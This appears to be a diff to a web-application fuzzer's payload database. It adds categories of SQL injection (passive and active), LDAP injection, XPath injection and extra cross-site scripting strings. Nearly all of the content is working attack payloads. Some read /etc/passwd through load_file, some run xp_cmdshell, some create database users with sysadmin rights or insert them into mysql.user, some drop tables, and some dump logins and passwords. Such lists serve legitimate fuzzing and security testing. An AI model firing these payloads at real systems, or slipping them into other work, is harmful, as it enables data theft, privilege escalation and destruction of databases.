@@ -151,10 +151,14 @@ P:FSE-UPP:Uppercase Format Strings:2
 %X
 f(x)=%X x 257
 
-P:SQL-INJ:SQL Injection:12
-> Replacive Fuzzers | SQL Injection
+P:SQL-INJ:SQL Injection:16
+> Replacive Fuzzers | SQL Injection | Injection
+A
 a'
+--
+@
 ?
+' AND 1=0) UNION ALL
 ' or 1=1
 ‘ or 1=1 --
 x' AND userid IS NULL; --
@@ -166,7 +170,113 @@ x' OR full_name LIKE '%Bob%
 23 OR 1=1
 '; exec master..xp_cmdshell 'ping 172.10.1.255'--
 
-P:XSS-ONE:Basic XSS:12
+P:SQL-SQP:Passive SQL Injection:55
+> Replacive Fuzzers | SQL Injection | Injection
+'||(elt(-3+5,bin(15),ord(10),hex(char(45))))
+||6
+'||'6
+(||6)
+' OR 1=1-- 
+OR 1=1
+' OR '1'='1
+; OR '1'='1'
+%22+or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+
+' or 1=1--
+" or 1=1--
+' or 1=1 /*
+or 1=1--
+' or 'a'='a
+" or "a"="a
+') or ('a'='a
+Admin' OR '
+'%20SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES--
+) UNION SELECT%20*%20FROM%20INFORMATION_SCHEMA.TABLES;
+' having 1=1--
+' having 1=1--
+' group by userid having 1=1--
+' SELECT name FROM syscolumns WHERE id = (SELECT id FROM sysobjects WHERE name = tablename')--
+' or 1 in (select @@version)--
+' union all select @@version--
+' OR 'unusual' = 'unusual'
+' OR 'something' = 'some'+'thing'
+' OR 'text' = N'text'
+' OR 'something' like 'some%'
+' OR 2 > 1
+' OR 'text' > 't'
+' OR 'whatever' in ('whatever')
+' OR 2 BETWEEN 1 and 3
+' or username like char(37);
+' union select * from users where login = char(114,111,111,116);
+' union select 
+Password:*/=1--
+UNI/**/ON SEL/**/ECT
+'; EXECUTE IMMEDIATE 'SEL' || 'ECT US' || 'ER'
+'; EXEC ('SEL' + 'ECT US' + 'ER')
+'/**/OR/**/1/**/=/**/1
+' or 1/*
++or+isnull%281%2F0%29+%2F*
+%27+OR+%277659%27%3D%277659
+%22+or+isnull%281%2F0%29+%2F*
+%27+--+&password=
+'; begin declare @var varchar(8000) set @var=':' select @var=@var+'+login+'/'+password+' ' from users where login > 
+@var select @var as var into temp end --
+' and 1 in (select var from temp)--
+' union select 1,load_file('/etc/passwd'),1,1,1;
+1;(load_file(char(47,101,116,99,47,112,97,115,115,119,100))),1,1,1;
+' and 1=( if((load_file(char(110,46,101,120,116))<>char(39,39)),1,0));
+
+P:SQL-SQI:Active SQL Injection:9
+> Replacive Fuzzers | SQL Injection| Injection
+'; exec master..xp_cmdshell 'ping 10.10.1.2'--
+CREATE USER name IDENTIFIED BY 'pass123'
+CREATE USER name IDENTIFIED BY pass123 TEMPORARY TABLESPACE temp DEFAULT TABLESPACE users; 
+' ; drop table temp --
+exec sp_addlogin 'name' , 'password'
+exec sp_addsrvrolemember 'name' , 'sysadmin'
+INSERT INTO mysql.user (user, host, password) VALUES ('name', 'localhost', PASSWORD('pass123'))
+GRANT CONNECT TO name; GRANT RESOURCE TO name;
+INSERT INTO Users(Login, Password, Level) VALUES( char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72) + char(0x70) + char(0x65) + char(0x74) + char(0x65) + char(0x72),char(0x64)
+
+P:LDP-INJ:LDAP Injection:20
+> Replacive Fuzzers | LDAP Injection | Injection
+|
+!
+(
+)
+%28
+%29
+&
+%26
+%21
+%7C
+*|
+%2A%7C
+*(|(mail=*))
+%2A%28%7C%28mail%3D%2A%29%29
+*(|(objectclass=*))
+%2A%28%7C%28objectclass%3D%2A%29%29
+*()|%26'
+admin*
+admin*)((|userPassword=*)
+*)(uid=*))(|(uid=*
+
+P:XPT-INJ:XPATH Injection:10
+> Replacive Fuzzers | XPATH Injection | Injection
+'+or+'1'='1
+'+or+''='
+x'+or+1=1+or+'x'='y
+/
+//
+//*
+*/*
+@*
+count(/child::node())
+x'+or+name()='username'+or+'x'='y
+
+P:XSS-ONE:Basic XSS:14
 > Cross Site Scripting | Replacive Fuzzers
 <IMG SRC=javascript:alert('XSS')>
 <IMG SRC=JaVaScRiPt:alert('XSS')>
@@ -180,9 +290,11 @@ perl -e 'print "<SCR\0IPT>alert("XSS")</SCR\0IPT>";' > out
 <BODY onload!#$%&()*~+-_.,:;?@[/|\\]^`=alert("XSS")>
 <<SCRIPT>alert("XSS");//<</SCRIPT>
 <IFRAME SRC="javascript:alert('XSS');"></IFRAME>
+<IMG SRC="jav&#x09;ascript:alert(<WBR>'XSS');">
+<IMG SRC="jav&#x0A;ascript:alert(<WBR>'XSS');">
 
 P:XSS-XML:XSS XML Injection:6
-> Cross Site Scripting | XML Injection | Replacive Fuzzers
+> Cross Site Scripting | XML Injection | Replacive Fuzzers | Injection
 <XML ID=I><X><C><![CDATA[<IMG SRC="javas]]><![CDATA[cript:alert('XSS');">]]></C></X></xml><SPAN DATASRC=#I DATAFLD=C DATAFORMATAS=HTML>
 <XML ID="xss"><I><B><IMG SRC="javas<!-- -->cript:alert('XSS')"></B></I></XML><SPAN DATASRC="#xss" DATAFLD="B" DATAFORMATAS="HTML"></SPAN>
 <HTML><BODY><?xml:namespace prefix="t" ns="urn:schemas-microsoft-com:time"><?import namespace="t" implementation="#default#time2"><t:set attributeName="innerHTML" to="XSS<SCRIPT DEFER>alert('XSS')</SCRIPT>"> </BODY></HTML>
